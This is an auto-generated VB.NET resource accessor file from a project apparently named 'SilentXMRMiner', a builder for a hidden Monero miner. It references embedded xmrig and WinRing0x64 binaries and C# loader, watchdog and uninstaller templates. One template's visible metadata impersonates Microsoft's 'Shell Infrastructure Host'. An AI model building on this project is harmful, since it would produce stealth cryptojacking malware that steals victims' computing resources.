﻿'------------------------------------------------------------------------------
' <auto-generated>
'     This code was generated by a tool.
'     Runtime Version:4.0.30319.42000
'
'     Changes to this file may cause incorrect behavior and will be lost if
'     the code is regenerated.
' </auto-generated>
'------------------------------------------------------------------------------

Option Strict On
Option Explicit On

Imports System

Namespace My.Resources
    
    'This class was auto-generated by the StronglyTypedResourceBuilder
    'class via a tool like ResGen or Visual Studio.
    'To add or remove a member, edit your .ResX file then rerun ResGen
    'with the /str option, or rebuild your VS project.
    '''<summary>
    '''  A strongly-typed resource class, for looking up localized strings, etc.
    '''</summary>
    <Global.System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0"),  _
     Global.System.Diagnostics.DebuggerNonUserCodeAttribute(),  _
     Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute(),  _
     Global.Microsoft.VisualBasic.HideModuleNameAttribute()>  _
    Friend Module Resources
        
        Private resourceMan As Global.System.Resources.ResourceManager
        
        Private resourceCulture As Global.System.Globalization.CultureInfo
        
        '''<summary>
        '''  Returns the cached ResourceManager instance used by this class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend ReadOnly Property ResourceManager() As Global.System.Resources.ResourceManager
            Get
                If Object.ReferenceEquals(resourceMan, Nothing) Then
                    Dim temp As Global.System.Resources.ResourceManager = New Global.System.Resources.ResourceManager("SilentXMRMiner.Resources", GetType(Resources).Assembly)
                    resourceMan = temp
                End If
                Return resourceMan
            End Get
        End Property
        
        '''<summary>
        '''  Overrides the current thread's CurrentUICulture property for all
        '''  resource lookups using this strongly typed resource class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend Property Culture() As Global.System.Globalization.CultureInfo
            Get
                Return resourceCulture
            End Get
            Set
                resourceCulture = value
            End Set
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Byte[].
        '''</summary>
        Friend ReadOnly Property administrator() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("administrator", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Byte[].
        '''</summary>
        Friend ReadOnly Property libs() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("libs", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to using System;
        '''using System.IO;
        '''using System.Reflection;
        '''using System.Security.Cryptography;
        '''using System.Text;
        '''using System.Resources;
        '''using System.Threading;
        '''using System.Diagnostics;
        '''using System.Runtime.InteropServices;
        '''using System.Linq;
        '''#if DefDebug
        '''using System.Windows.Forms;
        '''#endif
        '''
        '''#if DefAssembly
        '''[assembly: AssemblyTitle(&quot;%Title%&quot;)]
        '''[assembly: AssemblyDescription(&quot;%Description%&quot;)]
        '''[assembly: AssemblyCompany(&quot;%Company%&quot;)]
        '''[assembly: AssemblyProduct(&quot;%Product%&quot;)]
        '''[assembly: Assembl [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Loader() As String
            Get
                Return ResourceManager.GetString("Loader", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Byte[].
        '''</summary>
        Friend ReadOnly Property Mandark() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("Mandark", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Drawing.Bitmap.
        '''</summary>
        Friend ReadOnly Property microsoft_admin() As System.Drawing.Bitmap
            Get
                Dim obj As Object = ResourceManager.GetObject("microsoft-admin", resourceCulture)
                Return CType(obj,System.Drawing.Bitmap)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
        '''</summary>
        Friend ReadOnly Property Monero() As System.Drawing.Icon
            Get
                Dim obj As Object = ResourceManager.GetObject("Monero", resourceCulture)
                Return CType(obj,System.Drawing.Icon)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Drawing.Bitmap.
        '''</summary>
        Friend ReadOnly Property MoneroPNG() As System.Drawing.Bitmap
            Get
                Dim obj As Object = ResourceManager.GetObject("MoneroPNG", resourceCulture)
                Return CType(obj,System.Drawing.Bitmap)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to using System;
        '''using System.Diagnostics;
        '''using System.IO;
        '''using System.IO.Compression;
        '''using System.Management;
        '''using System.Reflection;
        '''using System.Runtime.InteropServices;
        '''using System.Security.Cryptography;
        '''using System.Security.Principal;
        '''using System.Text;
        '''using System.Threading;
        '''using Microsoft.Win32;
        '''#if DefDebug
        '''using System.Windows.Forms;
        '''#endif
        '''
        '''#if DefAssembly
        '''[assembly: AssemblyTitle(&quot;%Title%&quot;)]
        '''[assembly: AssemblyDescription(&quot;%Description%&quot;)]
        '''[assembly: AssemblyCompany(&quot;%Comp [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Program() As String
            Get
                Return ResourceManager.GetString("Program", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to using System;
        '''using System.IO;
        '''using System.Reflection;
        '''using System.Security.Cryptography;
        '''using System.Text;
        '''using System.Resources;
        '''using System.Threading;
        '''using System.Diagnostics;
        '''using Microsoft.Win32;
        '''using System.Linq;
        '''using System.Collections.Generic;
        '''using System.Management;
        '''#if DefDebug
        '''using System.Windows.Forms;
        '''#endif
        '''
        '''public partial class Uninstaller
        '''{
        '''    public static string lb = RGetString(&quot;#LIBSPATH&quot;);
        '''    public static string bD = Environment.GetFolderPath(Environment.SpecialFolder.Appli [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Uninstaller() As String
            Get
                Return ResourceManager.GetString("Uninstaller", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to using System;
        '''using System.Diagnostics;
        '''using System.IO;
        '''using System.Management;
        '''using System.Reflection;
        '''using System.Security.Cryptography;
        '''using System.Text;
        '''using System.Threading;
        '''#if DefDebug
        '''using System.Windows.Forms;
        '''#endif
        '''
        '''[assembly: AssemblyTitle(&quot;Shell Infrastructure Host&quot;)]
        '''[assembly: AssemblyDescription(&quot;Shell Infrastructure Host&quot;)]
        '''[assembly: AssemblyProduct(&quot;Microsoft® Windows® Operating System&quot;)]
        '''[assembly: AssemblyCopyright(&quot;© Microsoft Corporation. All Rights Reserved.&quot;)]
        '''[assembly: Ass [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Watchdog() As String
            Get
                Return ResourceManager.GetString("Watchdog", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Byte[].
        '''</summary>
        Friend ReadOnly Property WinRing0x64() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("WinRing0x64", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Byte[].
        '''</summary>
        Friend ReadOnly Property xmrig() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("xmrig", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
    End Module
End Namespace
